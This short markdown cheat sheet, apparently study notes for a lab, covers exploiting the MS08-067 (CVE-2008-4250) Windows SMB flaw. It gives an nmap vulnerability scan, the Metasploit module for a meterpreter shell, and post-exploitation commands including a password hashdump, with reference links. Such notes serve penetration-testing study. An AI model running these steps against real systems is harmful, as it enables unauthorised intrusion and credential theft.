# smb-vuln-ms08-067 | CVE-2008-4250 | NetAPI

## Metasploit

1. Check if target is vulnerable
   
        nmap --script vuln -p 137,139,445 10.10.10.4

2. Use Metasploit module `windows/smb/ms08_067_netapi` to obtain **meterpreter** shell access

        getuid
        run post/windows/gather/hashdump
        ipconfig

## References

* https://ivanitlearning.wordpress.com/2019/02/24/exploiting-ms17-010-without-metasploit-win-xp-sp3/
* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
* https://dzone.com/articles/exploiting-windows-xp-using-kali-linux
* https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/